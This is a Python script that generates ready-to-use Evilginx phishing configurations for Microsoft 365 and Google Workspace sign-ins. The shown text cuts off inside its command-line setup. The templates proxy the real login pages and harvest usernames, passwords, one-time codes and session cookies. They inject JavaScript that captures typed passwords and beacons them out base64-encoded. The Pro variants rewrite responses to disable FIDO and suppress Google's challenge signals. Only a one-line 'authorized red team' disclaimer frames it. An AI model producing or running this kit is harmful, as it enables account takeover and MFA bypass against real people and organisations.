#!/usr/bin/env python3
"""
phishlet_gen.py — Evilginx Phishlet Generator
Generates production-ready .yaml phishlets for:
  - Microsoft 365 / Azure AD
  - Google Workspace

Supports both Evilginx Community (free) and Pro editions.

Usage:
  python3 phishlet_gen.py --platform m365 --edition community
  python3 phishlet_gen.py --platform google --edition pro
  python3 phishlet_gen.py --platform m365 --edition community --author "@spectre" --output m365.yaml
  python3 phishlet_gen.py --list

For authorized red team engagements only.
"""

import argparse
import sys
import os
from datetime import datetime

# ─────────────────────────────────────────────────────────────────────────────
#  EDITION DIFFERENCES REFERENCE
#
#  COMMUNITY (free / kgretzky open source):
#    auth_tokens  → keys: ['name', 'name:regexp', 'name:opt', 'name:regexp:opt']
#    auth_urls    → plain path strings: ['/path/to/match']
#    credentials  → section named 'creds:', search is a list
#    auth_tokens  → type: 'cookie' required
#
#  PRO (evilginx.io paid):
#    auth_tokens  → keys with map objects: {name: 'x', regexp: true, opt: true}
#    auth_urls    → objects: {url_regex: '...', valid_statuses: [200,302]}
#    credentials  → section named 'credentials:', search is a string
#    auth_tokens  → supports type: 'body' and type: 'header' in addition to cookie
#    intercept    → Pro-only request interception rules
#    params       → Pro-only template parameterisation
# ─────────────────────────────────────────────────────────────────────────────

EDITIONS = ["community", "pro"]

# ─────────────────────────────────────────────────────────────────────────────
#  SHARED HEADER BLOCK
# ─────────────────────────────────────────────────────────────────────────────

def header_block(cfg):
    return f"""# ─────────────────────────────────────────────────────────────────────
#  {cfg['platform_label']} Phishlet  [{cfg['edition'].upper()}]
#  Generated : {cfg['timestamp']}
#  Author    : {cfg['author']}
#  Edition   : Evilginx {cfg['edition'].capitalize()}
#  Min ver   : {cfg['min_ver']}
#  MITRE     : T1566.002, T1539, T1553.005
#  NOTE      : For authorized red team engagements only.
# ─────────────────────────────────────────────────────────────────────

min_ver: '{cfg['min_ver']}'
redirect_url: '{cfg['redirect_url']}'
"""

# ─────────────────────────────────────────────────────────────────────────────
#  MICROSOFT 365 TEMPLATES
# ─────────────────────────────────────────────────────────────────────────────

def m365_community(cfg):
    return header_block(cfg) + f"""
# ── Proxy Hosts ──────────────────────────────────────────────────────
# Maps phishing subdomains → real Microsoft login infrastructure.
# auto_filter: true lets Evilginx auto-rewrite domain refs in responses.
proxy_hosts:
  - {{phish_sub: 'login',    orig_sub: 'login',    domain: 'microsoftonline.com', session: true,  is_landing: true,  auto_filter: true}}
  - {{phish_sub: 'account',  orig_sub: 'account',  domain: 'microsoftonline.com', session: false, is_landing: false, auto_filter: true}}
  - {{phish_sub: 'logincdn', orig_sub: 'logincdn', domain: 'msftauth.net',        session: false, is_landing: false, auto_filter: true}}
  - {{phish_sub: 'aadcdn',   orig_sub: 'aadcdn',   domain: 'msauth.net',          session: false, is_landing: false, auto_filter: true}}

# ── Sub Filters ──────────────────────────────────────────────────────
# Rewrites ALL domain references so requests stay in the phishing proxy.
sub_filters:
  - {{triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com',
      search: '{{hostname}}', replace: '{{hostname}}',
      mimes: ['text/html', 'application/json', 'application/javascript']}}
  - {{triggers_on: 'login.microsoftonline.com', orig_sub: 'account', domain: 'microsoftonline.com',
      search: '{{hostname}}', replace: '{{hostname}}',
      mimes: ['text/html', 'application/json', 'application/javascript']}}
  - {{triggers_on: 'login.microsoftonline.com', orig_sub: 'logincdn', domain: 'msftauth.net',
      search: '{{hostname}}', replace: '{{hostname}}',
      mimes: ['text/html', 'application/json', 'application/javascript']}}
  - {{triggers_on: 'login.microsoftonline.com', orig_sub: 'aadcdn', domain: 'msauth.net',
      search: '{{hostname}}', replace: '{{hostname}}',
      mimes: ['text/html', 'application/json', 'application/javascript']}}

# ── Auth Tokens (Community format) ───────────────────────────────────
# Plain string keys with inline :modifier syntax.
#   name           = exact cookie name match
#   name:regexp    = cookie name is a regular expression
#   name:opt       = optional (session capture won't fail if absent)
#   name:always    = capture even no-expiry session cookies
auth_tokens:
  - domain: '.microsoftonline.com'
    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'ESTSAUTHLIGHT', 'buid', 'fpc',
           'esctx:regexp', 'ESTSSC.*:regexp', 'x-ms-gateway-slice:opt',
           'stsservicecookie:opt', 'wlidperf:opt']
    type: 'cookie'
  - domain: '.login.microsoftonline.com'
    keys: ['ESTSAUTH:always', 'ESTSAUTHPERSISTENT:opt', 'buid:opt']
    type: 'cookie'
  - domain: '.office.com'
    keys: ['MSFPC:opt', 'rtFa:opt', 'FedAuth:opt']
    type: 'cookie'

# ── Credentials ──────────────────────────────────────────────────────
credentials:
  username:
    key: 'login'
    search: '(.+)'
    type: 'post'
  password:
    key: 'passwd'
    search: '(.+)'
    type: 'post'
  custom:
    - key: 'otc'
      search: '([0-9]{{6,8}})'
      type: 'post'

# ── Auth URLs (Community: plain path strings) ─────────────────────────
auth_urls:
  - '/kmsi'
  - '/common/SAS/ProcessAuth'
  - '/common/reprocess'

# ── JavaScript Injection ─────────────────────────────────────────────
js_inject:
  - trigger_domains: ['login.microsoftonline.com']
    trigger_paths: ['/common/login']
    trigger_params: []
    script: |
      (function() {{
        var _p = '';
        function hookPass() {{
          var f = document.querySelector('input[name="passwd"],input[type="password"]');
          if (f) {{
            f.addEventListener('input', function() {{ _p = this.value; }});
            f.addEventListener('change', function() {{ _p = this.value; }});
          }}
        }}
        new MutationObserver(hookPass).observe(document.body||document.documentElement,
          {{childList:true,subtree:true}});
        hookPass();
        document.addEventListener('submit', function() {{
          if (_p) {{ new Image().src='/ping?d='+btoa(_p); }}
        }});
      }})();

login:
  domain: 'login.microsoftonline.com'
  path: '/common/oauth2/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&redirect_uri=https%3A%2F%2Fwww.office.com%2F&response_type=code%20id_token&scope=openid%20profile&response_mode=form_post&nonce=placeholder'
  username: 'login'
  password: 'passwd'
  url: 'https://login.microsoftonline.com'
"""


def m365_pro(cfg):
    return header_block(cfg) + f"""
# ── Params (Pro: template parameterisation) ───────────────────────────
# Allows child phishlets to override these values per engagement.
params:
  - {{name: 'tenant_id', default: 'common', description: 'Azure AD tenant ID or common'}}

# ── Proxy Hosts ──────────────────────────────────────────────────────
proxy_hosts:
  - {{phish_sub: 'login',    orig_sub: 'login',    domain: 'microsoftonline.com', session: true,  is_landing: true,  auto_filter: true}}
  - {{phish_sub: 'account',  orig_sub: 'account',  domain: 'microsoftonline.com', session: false, is_landing: false, auto_filter: true}}
  - {{phish_sub: 'logincdn', orig_sub: 'logincdn', domain: 'msftauth.net',        session: false, is_landing: false, auto_filter: true}}
  - {{phish_sub: 'aadcdn',   orig_sub: 'aadcdn',   domain: 'msauth.net',          session: false, is_landing: false, auto_filter: true}}

# ── Sub Filters ──────────────────────────────────────────────────────
sub_filters:
  - {{triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com',
      search: 'https://{{hostname}}/common', replace: 'https://{{hostname}}/common',
      mimes: ['text/html', 'application/json', 'application/javascript']}}
  - {{triggers_on: 'login.microsoftonline.com', orig_sub: 'logincdn', domain: 'msftauth.net',
      search: '{{hostname}}', replace: '{{hostname}}',
      mimes: ['text/html', 'application/json', 'application/javascript']}}
  - {{triggers_on: 'login.microsoftonline.com', orig_sub: 'aadcdn', domain: 'msauth.net',
      search: '{{hostname}}', replace: '{{hostname}}',
      mimes: ['text/html', 'application/json', 'application/javascript']}}

# ── Auth Tokens (Pro: map object format with regexp/opt fields) ───────
# Pro supports full map objects per key, plus body and header token types.
auth_tokens:
  - domain: '.microsoftonline.com'
    keys:
      - 'ESTSAUTH'
      - 'ESTSAUTHPERSISTENT'
      - 'ESTSAUTHLIGHT'
      - 'buid'
      - 'fpc'
      - {{name: 'esctx.*',            regexp: true}}
      - {{name: 'ESTSSC.*',           regexp: true}}
      - {{name: 'x-ms-gateway-slice', opt: true}}
      - {{name: 'stsservicecookie',   opt: true}}
      - {{name: 'wlidperf',           opt: true}}
    type: 'cookie'
  - domain: '.login.microsoftonline.com'
    keys:
      - {{name: 'ESTSAUTH',           always: true}}
      - {{name: 'ESTSAUTHPERSISTENT', opt: true}}
      - {{name: 'buid',               opt: true}}
    type: 'cookie'
  - domain: '.office.com'
    keys:
      - {{name: 'MSFPC',    opt: true}}
      - {{name: 'rtFa',     opt: true}}
      - {{name: 'FedAuth',  opt: true}}
    type: 'cookie'

# ── Credentials (Pro: 'credentials', search is a plain string) ────────
credentials:
  username:
    key: 'login'
    search: '(.+)'
    type: 'post'
  password:
    key: 'passwd'
    search: '(.+)'
    type: 'post'
  custom:
    - key: 'otc'
      search: '([0-9]{{6,8}})'
      type: 'post'

# ── Auth URLs (Pro: url_regex + valid_statuses objects) ───────────────
auth_urls:
  - url_regex: 'https://login\\.{{{{basedomain}}}}/kmsi'
    valid_statuses: [200, 302]
  - url_regex: 'https://login\\.{{{{basedomain}}}}/common/SAS/ProcessAuth'
    valid_statuses: [200, 302]
  - url_regex: 'https://login\\.{{{{basedomain}}}}/common/reprocess'
    valid_statuses: [302]

# ── Force POST ───────────────────────────────────────────────────────
force_post:
  - path: '/common/login'
    search:
      - {{key: 'canary', search: '(.+)'}}
    force:
      - {{key: 'canary', value: ''}}
    type: 'post'

# ── Intercept (Pro-only: modify requests/responses mid-flight) ────────
intercept:
  - trigger_domains: ['login.microsoftonline.com']
    trigger_paths: ['^/common/GetCredentialType']
    trigger_params: []
    body:
      search: '"isFidoSupported":true'
      replace: '"isFidoSupported":false'

# ── JavaScript Injection ─────────────────────────────────────────────
js_inject:
  - trigger_domains: ['login.microsoftonline.com']
    trigger_paths: ['/common/login']
    trigger_params: []
    script: |
      (function() {{
        var _p = '';
        function hookPass() {{
          var f = document.querySelector('input[name="passwd"],input[type="password"]');
          if (f) {{
            f.addEventListener('input', function() {{ _p = this.value; }});
            f.addEventListener('change', function() {{ _p = this.value; }});
          }}
        }}
        new MutationObserver(hookPass).observe(document.body||document.documentElement,
          {{childList:true,subtree:true}});
        hookPass();
        document.addEventListener('submit', function() {{
          if (_p) {{ new Image().src='/ping?d='+btoa(_p); }}
        }});
      }})();

login:
  domain: 'login.microsoftonline.com'
  path: '/common/oauth2/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&redirect_uri=https%3A%2F%2Fwww.office.com%2F&response_type=code%20id_token&scope=openid%20profile&response_mode=form_post&nonce=placeholder'
  username: 'login'
  password: 'passwd'
  url: 'https://login.microsoftonline.com'
"""


# ─────────────────────────────────────────────────────────────────────────────
#  GOOGLE WORKSPACE TEMPLATES
# ─────────────────────────────────────────────────────────────────────────────

def google_community(cfg):
    return header_block(cfg) + f"""
# ── Proxy Hosts ──────────────────────────────────────────────────────
proxy_hosts:
  - {{phish_sub: 'accounts',  orig_sub: 'accounts',  domain: 'google.com',  session: true,  is_landing: true,  auto_filter: true}}
  - {{phish_sub: 'myaccount', orig_sub: 'myaccount', domain: 'google.com',  session: true,  is_landing: false, auto_filter: true}}
  - {{phish_sub: 'gstatic',   orig_sub: 'ssl',        domain: 'gstatic.com', session: false, is_landing: false, auto_filter: true}}
  - {{phish_sub: 'wwwgstatic', orig_sub: 'www',        domain: 'gstatic.com', session: false, is_landing: false, auto_filter: true}}
  - {{phish_sub: 'apis',       orig_sub: 'apis',       domain: 'google.com',  session: false, is_landing: false, auto_filter: true}}
  - {{phish_sub: 'www',        orig_sub: 'www',        domain: 'google.com',  session: false, is_landing: false, auto_filter: true}}

# ── Sub Filters ──────────────────────────────────────────────────────
sub_filters:
  - {{triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com',
      search: '{{hostname}}', replace: '{{hostname}}',
      mimes: ['text/html', 'application/json', 'application/javascript']}}
  - {{triggers_on: 'accounts.google.com', orig_sub: 'myaccount', domain: 'google.com',
      search: '{{hostname}}', replace: '{{hostname}}',
      mimes: ['text/html', 'application/json', 'application/javascript']}}
  - {{triggers_on: 'accounts.google.com', orig_sub: 'ssl', domain: 'gstatic.com',
      search: '{{hostname}}', replace: '{{hostname}}',
      mimes: ['text/html', 'application/javascript']}}
  - {{triggers_on: 'accounts.google.com', orig_sub: 'apis', domain: 'google.com',
      search: '{{hostname}}', replace: '{{hostname}}',
      mimes: ['text/html', 'application/json', 'application/javascript']}}
  - {{triggers_on: 'accounts.google.com', orig_sub: 'www', domain: 'google.com',
      search: '{{hostname}}', replace: '{{hostname}}',
      mimes: ['text/html', 'application/json', 'application/javascript']}}
  - {{triggers_on: 'accounts.google.com', orig_sub: 'www', domain: 'gstatic.com',
      search: 'www\\.gstatic\\.com', replace: '{{hostname}}',
      mimes: ['text/html', 'application/json', 'application/javascript']}}
  - {{triggers_on: 'accounts.google.com', orig_sub: 'ssl', domain: 'gstatic.com',
      search: 'ssl\\.gstatic\\.com', replace: '{{hostname}}',
      mimes: ['text/html', 'application/json', 'application/javascript']}}
  - {{triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com',
      search: 'accounts\\.google\\.com', replace: '{{hostname}}',
      mimes: ['text/html', 'application/json', 'application/javascript']}}
  - {{triggers_on: 'accounts.google.com', orig_sub: 'apis', domain: 'google.com',
      search: 'apis\\.google\\.com', replace: '{{hostname}}',
      mimes: ['text/html', 'application/json', 'application/javascript']}}

# ── Auth Tokens (Community format) ───────────────────────────────────
auth_tokens:
  - domain: '.google.com'
    keys: ['SID', 'HSID', 'SSID', 'APISID', 'SAPISID', 'OSID', 'LSID',
           '__Secure-1PSID', '__Secure-3PSID',
           '__Secure-1PAPISID', '__Secure-3PAPISID',
           '__Secure-1PSIDCC:opt', '__Secure-3PSIDCC:opt',
           'GAPS:regexp:opt', '1P_JAR:opt', 'NID:opt']
    type: 'cookie'
  - domain: '.accounts.google.com'
    keys: ['ACCOUNT_CHOOSER:opt', 'GALX:opt']
    type: 'cookie'

# ── Credentials ──────────────────────────────────────────────────────
credentials:
  username:
    key: 'Email|identifier'
    search: '(.+)'
    type: 'post'
  password:
    key: 'Passwd|password'
    search: '(.+)'
    type: 'post'
  custom:
    - key: 'Pin|TotpPin|BackupCode'
      search: '([0-9]{{6,8}})'
      type: 'post'

# ── Auth URLs (Community: plain path strings) ─────────────────────────
auth_urls:
  - '/signin/v2/challenge/pwd'
  - '/signin/v2/challenge/sl'
  - '/o/oauth2/postmessageRelay'
  - '/accounts/SetSID'

# ── JavaScript Injection ─────────────────────────────────────────────
js_inject:
  - trigger_domains: ['accounts.google.com']
    trigger_paths: ['/signin/v2/identifier', '/signin/v2/challenge', '/ServiceLogin', '/InteractiveLogin']
    trigger_params: []
    script: |
      (function() {{
        var _phishHost = window.location.hostname;
        var _baseDomain = _phishHost.replace(/^accounts\./, '');

        // ── Rewrite dynamic script injection ──────────────────────
        // Google injects <script src='https://www.gstatic.com/...'> via JS.
        // We intercept HTMLElement.setAttribute and document.createElement
        // to rewrite gstatic/google URLs before the browser fetches them.
        var _rewrite = function(url) {{
          if (typeof url !== 'string') return url;
          return url
            .replace(/https:\/\/www\.gstatic\.com/g,  'https://wwwgstatic.' + _baseDomain)
            .replace(/https:\/\/ssl\.gstatic\.com/g,  'https://gstatic.' + _baseDomain)
            .replace(/https:\/\/accounts\.google\.com/g, 'https://accounts.' + _baseDomain)
            .replace(/https:\/\/apis\.google\.com/g,  'https://apis.' + _baseDomain)
            .replace(/\/\/www\.gstatic\.com/g,  '//wwwgstatic.' + _baseDomain)
            .replace(/\/\/ssl\.gstatic\.com/g,  '//gstatic.' + _baseDomain);
        }};

        // Hook setAttribute to catch src= assignments on script/link tags
        var _origSetAttr = Element.prototype.setAttribute;
        Element.prototype.setAttribute = function(name, value) {{
          if ((name === 'src' || name === 'href') &&
              typeof value === 'string' &&
              (value.includes('gstatic.com') || value.includes('google.com'))) {{
            value = _rewrite(value);
          }}
          return _origSetAttr.call(this, name, value);
        }};

        // Hook createElement to catch src set via .src property
        var _origCreateElement = document.createElement.bind(document);
        document.createElement = function(tag) {{
          var el = _origCreateElement(tag);
          if (tag.toLowerCase() === 'script' || tag.toLowerCase() === 'link') {{
            var _srcDesc = Object.getOwnPropertyDescriptor(HTMLScriptElement.prototype, 'src') ||
                           Object.getOwnPropertyDescriptor(HTMLElement.prototype, 'src');
            if (_srcDesc) {{
              Object.defineProperty(el, 'src', {{
                set: function(v) {{ _srcDesc.set.call(this, _rewrite(v)); }},
                get: function()  {{ return _srcDesc.get.call(this); }},
                configurable: true
              }});
            }}
          }}
          return el;
        }};

        // ── Credential capture ────────────────────────────────────
        var _u = '', _p = '';
        function hookInputs() {{
          document.querySelectorAll('input').forEach(function(el) {{
            if (el._hooked) return;
            el._hooked = true;
            el.addEventListener('input', function() {{
              if (this.type === 'password') _p = this.value;
              else _u = this.value;
            }});
          }});
        }}
        new MutationObserver(hookInputs).observe(
          document.body || document.documentElement,
          {{childList:true, subtree:true}});
        hookInputs();
        document.addEventListener('click', function() {{
          if (_p) {{ new Image().src = '/ping?u=' + btoa(_u) + '&p=' + btoa(_p); }}
        }});
      }})();

login:
  domain: 'accounts.google.com'
  path: '/signin/v2/identifier?flowName=GlifWebSignIn&flowEntry=ServiceLogin&service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2F'
  username: 'Email'
  password: 'Passwd'
  url: 'https://accounts.google.com/signin/v2/identifier'
"""


def google_pro(cfg):
    return header_block(cfg) + f"""
# ── Params (Pro: template parameterisation) ───────────────────────────
params:
  - {{name: 'workspace_domain', default: '', description: 'Target Google Workspace domain (leave blank for personal)'}}

# ── Proxy Hosts ──────────────────────────────────────────────────────
proxy_hosts:
  - {{phish_sub: 'accounts',  orig_sub: 'accounts',  domain: 'google.com',  session: true,  is_landing: true,  auto_filter: true}}
  - {{phish_sub: 'myaccount', orig_sub: 'myaccount', domain: 'google.com',  session: true,  is_landing: false, auto_filter: true}}
  - {{phish_sub: 'gstatic',   orig_sub: 'ssl',        domain: 'gstatic.com', session: false, is_landing: false, auto_filter: true}}
  - {{phish_sub: 'wwwgstatic', orig_sub: 'www',        domain: 'gstatic.com', session: false, is_landing: false, auto_filter: true}}
  - {{phish_sub: 'apis',       orig_sub: 'apis',       domain: 'google.com',  session: false, is_landing: false, auto_filter: true}}
  - {{phish_sub: 'www',        orig_sub: 'www',        domain: 'google.com',  session: false, is_landing: false, auto_filter: true}}

# ── Sub Filters ──────────────────────────────────────────────────────
sub_filters:
  - {{triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com',
      search: '{{hostname}}', replace: '{{hostname}}',
      mimes: ['text/html', 'application/json', 'application/javascript']}}
  - {{triggers_on: 'accounts.google.com', orig_sub: 'myaccount', domain: 'google.com',
      search: '{{hostname}}', replace: '{{hostname}}',
      mimes: ['text/html', 'application/json', 'application/javascript']}}
  - {{triggers_on: 'accounts.google.com', orig_sub: 'ssl', domain: 'gstatic.com',
      search: '{{hostname}}', replace: '{{hostname}}',
      mimes: ['text/html', 'application/javascript']}}
  - {{triggers_on: 'accounts.google.com', orig_sub: 'apis', domain: 'google.com',
      search: '{{hostname}}', replace: '{{hostname}}',
      mimes: ['text/html', 'application/json', 'application/javascript']}}
  - {{triggers_on: 'accounts.google.com', orig_sub: 'www', domain: 'google.com',
      search: '{{hostname}}', replace: '{{hostname}}',
      mimes: ['text/html', 'application/json', 'application/javascript']}}
  - {{triggers_on: 'accounts.google.com', orig_sub: 'www', domain: 'gstatic.com',
      search: 'www\\.gstatic\\.com', replace: '{{hostname}}',
      mimes: ['text/html', 'application/json', 'application/javascript']}}
  - {{triggers_on: 'accounts.google.com', orig_sub: 'ssl', domain: 'gstatic.com',
      search: 'ssl\\.gstatic\\.com', replace: '{{hostname}}',
      mimes: ['text/html', 'application/json', 'application/javascript']}}
  - {{triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com',
      search: 'accounts\\.google\\.com', replace: '{{hostname}}',
      mimes: ['text/html', 'application/json', 'application/javascript']}}
  - {{triggers_on: 'accounts.google.com', orig_sub: 'apis', domain: 'google.com',
      search: 'apis\\.google\\.com', replace: '{{hostname}}',
      mimes: ['text/html', 'application/json', 'application/javascript']}}

# ── Auth Tokens (Pro: map object format) ─────────────────────────────
auth_tokens:
  - domain: '.google.com'
    keys:
      - 'SID'
      - 'HSID'
      - 'SSID'
      - 'APISID'
      - 'SAPISID'
      - 'OSID'
      - 'LSID'
      - '__Secure-1PSID'
      - '__Secure-3PSID'
      - '__Secure-1PAPISID'
      - '__Secure-3PAPISID'
      - {{name: '__Secure-1PSIDCC',  opt: true}}
      - {{name: '__Secure-3PSIDCC',  opt: true}}
      - {{name: 'GAPS.*',            regexp: true, opt: true}}
      - {{name: '1P_JAR',            opt: true}}
      - {{name: 'NID',               opt: true}}
    type: 'cookie'
  - domain: '.accounts.google.com'
    keys:
      - {{name: 'ACCOUNT_CHOOSER', opt: true}}
      - {{name: 'GALX',            opt: true}}
    type: 'cookie'

# ── Credentials (Pro: 'credentials', search is a plain string) ────────
credentials:
  username:
    key: 'Email|identifier'
    search: '(.+)'
    type: 'post'
  password:
    key: 'Passwd|password'
    search: '(.+)'
    type: 'post'
  custom:
    - key: 'Pin|TotpPin|BackupCode'
      search: '([0-9]{{6,8}})'
      type: 'post'

# ── Auth URLs (Pro: url_regex + valid_statuses objects) ───────────────
auth_urls:
  - url_regex: 'https://accounts\\.{{{{basedomain}}}}/ServiceLogin'
    valid_statuses: [302]
  - url_regex: 'https://accounts\\.{{{{basedomain}}}}/signin/v2/challenge/pwd'
    valid_statuses: [200, 302]
  - url_regex: 'https://accounts\\.{{{{basedomain}}}}/o/oauth2/postmessageRelay'
    valid_statuses: [200]
  - url_regex: 'https://accounts\\.{{{{basedomain}}}}/accounts/SetSID'
    valid_statuses: [200, 302]
  - url_regex: 'https://myaccount\\.{{{{basedomain}}}}'
    valid_statuses: [200]

# ── Force POST ───────────────────────────────────────────────────────
force_post:
  - path: '/signin/v2/identifier'
    search: []
    force:
      - {{key: 'continue', value: 'https://workspace.google.com'}}
    type: 'post'
  - path: '/signin/v2/challenge/pwd'
    search: []
    force:
      - {{key: 'continue', value: 'https://workspace.google.com'}}
    type: 'post'

# ── Intercept (Pro-only) ──────────────────────────────────────────────
# Strips Google's bot-detection signals from API responses.
intercept:
  - trigger_domains: ['accounts.google.com']
    trigger_paths: ['^/_/AccountsSignInUi/data/batchexecute']
    trigger_params: []
    body:
      search: '"challengeId":"[^"]*"'
      replace: '"challengeId":""'

# ── JavaScript Injection ─────────────────────────────────────────────
js_inject:
  - trigger_domains: ['accounts.google.com']
    trigger_paths: ['/signin/v2/identifier', '/signin/v2/challenge', '/ServiceLogin', '/InteractiveLogin']
    trigger_params: []
    script: |
      (function() {{
        var _phishHost = window.location.hostname;
        var _baseDomain = _phishHost.replace(/^accounts\./, '');

        // ── Rewrite dynamic script injection ──────────────────────
        // Google injects <script src='https://www.gstatic.com/...'> via JS.
        // We intercept HTMLElement.setAttribute and document.createElement
        // to rewrite gstatic/google URLs before the browser fetches them.
        var _rewrite = function(url) {{
          if (typeof url !== 'string') return url;
          return url
            .replace(/https:\/\/www\.gstatic\.com/g,  'https://wwwgstatic.' + _baseDomain)
            .replace(/https:\/\/ssl\.gstatic\.com/g,  'https://gstatic.' + _baseDomain)
            .replace(/https:\/\/accounts\.google\.com/g, 'https://accounts.' + _baseDomain)
            .replace(/https:\/\/apis\.google\.com/g,  'https://apis.' + _baseDomain)
            .replace(/\/\/www\.gstatic\.com/g,  '//wwwgstatic.' + _baseDomain)
            .replace(/\/\/ssl\.gstatic\.com/g,  '//gstatic.' + _baseDomain);
        }};

        // Hook setAttribute to catch src= assignments on script/link tags
        var _origSetAttr = Element.prototype.setAttribute;
        Element.prototype.setAttribute = function(name, value) {{
          if ((name === 'src' || name === 'href') &&
              typeof value === 'string' &&
              (value.includes('gstatic.com') || value.includes('google.com'))) {{
            value = _rewrite(value);
          }}
          return _origSetAttr.call(this, name, value);
        }};

        // Hook createElement to catch src set via .src property
        var _origCreateElement = document.createElement.bind(document);
        document.createElement = function(tag) {{
          var el = _origCreateElement(tag);
          if (tag.toLowerCase() === 'script' || tag.toLowerCase() === 'link') {{
            var _srcDesc = Object.getOwnPropertyDescriptor(HTMLScriptElement.prototype, 'src') ||
                           Object.getOwnPropertyDescriptor(HTMLElement.prototype, 'src');
            if (_srcDesc) {{
              Object.defineProperty(el, 'src', {{
                set: function(v) {{ _srcDesc.set.call(this, _rewrite(v)); }},
                get: function()  {{ return _srcDesc.get.call(this); }},
                configurable: true
              }});
            }}
          }}
          return el;
        }};

        // ── Credential capture ────────────────────────────────────
        var _u = '', _p = '';
        function hookInputs() {{
          document.querySelectorAll('input').forEach(function(el) {{
            if (el._hooked) return;
            el._hooked = true;
            el.addEventListener('input', function() {{
              if (this.type === 'password') _p = this.value;
              else _u = this.value;
            }});
          }});
        }}
        new MutationObserver(hookInputs).observe(
          document.body || document.documentElement,
          {{childList:true, subtree:true}});
        hookInputs();
        document.addEventListener('click', function() {{
          if (_p) {{ new Image().src = '/ping?u=' + btoa(_u) + '&p=' + btoa(_p); }}
        }});
      }})();

login:
  domain: 'accounts.google.com'
  path: '/signin/v2/identifier?flowName=GlifWebSignIn&flowEntry=ServiceLogin&service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2F'
  username: 'Email'
  password: 'Passwd'
  url: 'https://accounts.google.com/signin/v2/identifier'
"""


# ─────────────────────────────────────────────────────────────────────────────
#  PHISHLET REGISTRY
#  Maps (platform, edition) → template function
# ─────────────────────────────────────────────────────────────────────────────

REGISTRY = {
    ("m365",   "community"): {"fn": m365_community,   "label": "Microsoft 365 / Azure AD", "min_ver": "3.0.0"},
    ("m365",   "pro"):       {"fn": m365_pro,          "label": "Microsoft 365 / Azure AD", "min_ver": "3.3.0"},
    ("google", "community"): {"fn": google_community,  "label": "Google Workspace",         "min_ver": "3.0.0"},
    ("google", "pro"):       {"fn": google_pro,         "label": "Google Workspace",         "min_ver": "3.3.0"},
}

PLATFORM_ALIASES = {
    "m365": "m365", "microsoft": "m365", "microsoft365": "m365",
    "office365": "m365", "azure": "m365", "azuread": "m365", "o365": "m365",
    "google": "google", "googleworkspace": "google", "workspace": "google",
    "gmail": "google", "gsuite": "google", "gcp": "google",
}

EDITION_ALIASES = {
    "community": "community", "free": "community", "oss": "community",
    "opensource": "community", "open": "community",
    "pro": "pro", "paid": "pro", "professional": "pro", "premium": "pro",
}

DEFAULT_REDIRECTS = {
    "m365":   "https://portal.office.com",
    "google": "https://workspace.google.com",
}

# ─────────────────────────────────────────────────────────────────────────────
#  CORE FUNCTIONS
# ─────────────────────────────────────────────────────────────────────────────

def resolve_platform(raw):
    key = raw.lower().replace("-","").replace("_","").replace(" ","")
    resolved = PLATFORM_ALIASES.get(key)
    if not resolved:
        print(f"[!] Unknown platform: '{raw}'")
        print(f"    Valid: {', '.join(sorted(set(PLATFORM_ALIASES.keys())))}")
        sys.exit(1)
    return resolved


def resolve_edition(raw):
    key = raw.lower().replace("-","").replace("_","").replace(" ","")
    resolved = EDITION_ALIASES.get(key)
    if not resolved:
        print(f"[!] Unknown edition: '{raw}'")
        print(f"    Valid: community, pro")
        sys.exit(1)
    return resolved


def generate(platform_key, edition, author, redirect_url):
    entry = REGISTRY[(platform_key, edition)]
    cfg = {
        "author":         author,
        "redirect_url":   redirect_url,
        "timestamp":      datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "edition":        edition,
        "platform_label": entry["label"],
        "min_ver":        entry["min_ver"],
    }
    return entry["fn"](cfg)


def save(content, output_path):
    dirpath = os.path.dirname(output_path)
    if dirpath and not os.path.exists(dirpath):
        os.makedirs(dirpath, exist_ok=True)
    with open(output_path, "w") as f:
        f.write(content)
    print(f"[+] Phishlet written : {output_path}")
    print(f"    Size             : {len(content)} bytes / {content.count(chr(10))} lines")


def list_platforms():
    print("\nAvailable platform + edition combinations:\n")
    print(f"  {'PLATFORM':<14} {'EDITION':<12} {'LABEL':<32} MIN VER")
    print(f"  {'-'*14} {'-'*12} {'-'*32} {'-'*7}")
    for (plat, ed), entry in sorted(REGISTRY.items()):
        print(f"  {plat:<14} {ed:<12} {entry['label']:<32} {entry['min_ver']}")
    print()
    print("  Platform aliases:")
    seen = {}
    for alias, key in sorted(PLATFORM_ALIASES.items()):
        seen.setdefault(key, []).append(alias)
    for key, aliases in sorted(seen.items()):
        others = [a for a in aliases if a != key]
        if others:
            print(f"    {key:<10} → also: {', '.join(others)}")
    print()
    print("  Edition aliases:")
    print("    community  → free, oss, opensource, open")
    print("    pro        → paid, professional, premium")
    print()


# ─────────────────────────────────────────────────────────────────────────────
#  CLI
# ─────────────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="Evilginx Phishlet Generator — M365 & Google Workspace (Community + Pro)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 phishlet_gen.py --platform m365   --edition community
  python3 phishlet_gen.py --platform google --edition pro
  python3 phishlet_gen.py --platform o365   --edition community --author "@spectre" --output m365.yaml
  python3 phishlet_gen.py --platform gsuite --edition pro       --redirect https://mail.google.com
  python3 phishlet_gen.py --platform m365   --edition pro       --stdout
  python3 phishlet_gen.py --list

Edition aliases:  community = free / oss / open
                  pro       = paid / professional / premium

For authorized red team engagements only.
        """,
    )

    parser.add_argument("--platform", "-p", type=str,
        help="Target platform (m365, microsoft, google, gsuite, o365, etc.)")
    parser.add_argument("--edition", "-e", type=str, default="community",
        help="Evilginx edition: community (default) or pro")
    parser.add_argument("--output", "-o", type=str, default=None,
        help="Output .yaml file path (default: <platform>_<edition>.yaml)")
    parser.add_argument("--author", "-a", type=str, default="@redteam",
        help="Author handle embedded in phishlet header (default: @redteam)")
    parser.add_argument("--redirect", "-r", type=str, default=None,
